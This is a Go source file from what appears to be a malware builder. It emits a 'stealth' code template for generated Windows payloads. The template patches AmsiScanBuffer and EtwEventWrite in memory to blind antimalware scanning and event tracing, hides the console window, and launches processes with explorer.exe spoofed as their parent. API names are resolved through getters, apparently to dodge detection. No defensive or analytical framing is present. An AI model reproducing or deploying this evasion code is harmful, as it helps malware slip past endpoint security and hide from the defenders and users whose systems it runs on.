package buildergen

import "strings"

func templateStealth() string {
	return strings.TrimSpace(`
func patchAMSI() {
	amsi := syscall.NewLazyDLL(getAmsiDll())
	proc := amsi.NewProc(getAmsiScanBufferName())
	addr := proc.Addr()
	if addr == 0 {
		return
	}

	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	virtualProtect := kernel32.NewProc(getVirtualProtectName())

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(addr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return
	}

	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	virtualProtect.Call(addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func patchETW() {
	ntdll := syscall.NewLazyDLL(getNtdllDLL())
	proc := ntdll.NewProc(getEtwEventWriteName())
	addr := proc.Addr()
	if addr == 0 {
		return
	}

	patch := []byte{0xC3}

	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	virtualProtect := kernel32.NewProc(getVirtualProtectName())

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(addr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return
	}

	*(*byte)(unsafe.Pointer(addr)) = 0xC3

	virtualProtect.Call(addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func hideConsoleWindow() {
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	user32 := syscall.NewLazyDLL(getUser32DLL())

	getConsoleWindow := kernel32.NewProc(getConsoleWindowName())
	showWindow := user32.NewProc(getShowWindowName())

	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, 0)
	}
}

func blendProcessName() {
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	setTitle := kernel32.NewProc(getSetConsoleTitleWName())
	title, _ := syscall.UTF16PtrFromString("")
	setTitle.Call(uintptr(unsafe.Pointer(title)))
}

func spawnWithSpoofedParent(exePath string, args []string) error {
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())

	createProcess := kernel32.NewProc(getCreateProcessWName())
	openProcess := kernel32.NewProc(getOpenProcessName())
	closeHandle := kernel32.NewProc(getCloseHandleName())
	initProcAttrList := kernel32.NewProc(getInitProcAttrListName())
	updateProcAttr := kernel32.NewProc(getUpdateProcAttrName())
	deleteProcAttrList := kernel32.NewProc(getDeleteProcAttrListName())

	explorerPid := findExplorerPID()
	if explorerPid == 0 {
		cmd := exec.Command(exePath, args...)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		return cmd.Start()
	}

	parentHandle, _, _ := openProcess.Call(0x0080, 0, uintptr(explorerPid))
	if parentHandle == 0 {
		cmd := exec.Command(exePath, args...)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		return cmd.Start()
	}
	defer closeHandle.Call(parentHandle)

	var size uintptr
	initProcAttrList.Call(0, 1, 0, 0, uintptr(unsafe.Pointer(&size)))
	if size == 0 {
		cmd := exec.Command(exePath, args...)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		return cmd.Start()
	}

	attrListBuf := make([]byte, size)
	attrList := unsafe.Pointer(&attrListBuf[0])
	ret, _, _ := initProcAttrList.Call(uintptr(attrList), 1, 0, 0, uintptr(unsafe.Pointer(&size)))
	if ret == 0 {
		cmd := exec.Command(exePath, args...)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		return cmd.Start()
	}
	defer deleteProcAttrList.Call(uintptr(attrList))

	updateProcAttr.Call(
		uintptr(attrList),
		0,
		0x00020000,
		uintptr(unsafe.Pointer(&parentHandle)),
		unsafe.Sizeof(parentHandle),
		0, 0,
	)

	cmdLine, _ := syscall.UTF16PtrFromString("\"" + exePath + "\" " + strings.Join(args, " "))
	exePathW, _ := syscall.UTF16PtrFromString(exePath)

	type startupInfoEx struct {
		syscall.StartupInfo
		lpAttributeList unsafe.Pointer
	}

	si := startupInfoEx{}
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = 0x00000001
	si.ShowWindow = 0
	si.lpAttributeList = attrList

	var pi syscall.ProcessInformation

	createProcess.Call(
		uintptr(unsafe.Pointer(exePathW)),
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 0,
		0x00080000|0x08000000,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if pi.Process != 0 {
		closeHandle.Call(uintptr(pi.Process))
	}
	if pi.Thread != 0 {
		closeHandle.Call(uintptr(pi.Thread))
	}

	return nil
}

func findExplorerPID() uint32 {
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	snap := kernel32.NewProc(getCreateToolhelp32SnapshotName())
	first := kernel32.NewProc(getProcess32FirstWName())
	next := kernel32.NewProc(getProcess32NextWName())
	closeHandle := kernel32.NewProc(getCloseHandleName())

	h, _, _ := snap.Call(0x02, 0)
	if h == 0 || h == ^uintptr(0) {
		return 0
	}
	defer closeHandle.Call(h)

	type processEntry32W struct {
		Size              uint32
		CntUsage          uint32
		ProcessID         uint32
		DefaultHeapID     uintptr
		ModuleID          uint32
		Threads           uint32
		ParentProcessID   uint32
		PriClassBase      int32
		Flags             uint32
		ExeFile           [260]uint16
	}

	var pe processEntry32W
	pe.Size = uint32(unsafe.Sizeof(pe))

	ret, _, _ := first.Call(h, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return 0
	}

	explorerTarget := "explorer.exe"
	for {
		name := strings.ToLower(syscall.UTF16ToString(pe.ExeFile[:]))
		if name == explorerTarget {
			return pe.ProcessID
		}
		pe.Size = uint32(unsafe.Sizeof(pe))
		ret, _, _ = next.Call(h, uintptr(unsafe.Pointer(&pe)))
		if ret == 0 {
			break
		}
	}
	return 0
}

func applyStealthMeasures() {
	go patchAMSI()
	go patchETW()
	go hideConsoleWindow()
	go blendProcessName()
}
`)
}
